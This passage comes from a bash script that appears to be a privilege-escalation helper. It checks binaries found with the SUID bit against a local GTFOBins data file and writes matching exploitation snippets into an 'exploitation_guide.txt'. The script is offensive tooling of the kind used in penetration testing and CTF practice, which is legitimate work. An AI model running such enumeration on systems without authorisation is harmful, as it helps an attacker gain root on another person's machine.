            echo "==================================" >> exploitation_guide.txt
            
            # Check for SUID exploitation
            if grep -q "/$bin$" suid_binaries.txt; then
                echo "SUID exploitation:" >> exploitation_guide.txt
                
                # Try to find SUID-specific exploitation in GTFOBins data
                suid_example=$(awk "/^  $bin:/,/^  [a-z0-9_-]+:/" "$GTFOBINS_FILE" | grep -A 10 "suid:" | grep -v "^  [a-z0-9_-]\+:")
                
                if [ -n "$suid_example" ]; then
                    echo "$suid_example" | sed 's/^    /    /' >> exploitation_guide.txt
                else
                    echo "    No specific SUID exploitation found in GTFOBins." >> exploitation_guide.txt
                    echo "    Check manually at: https://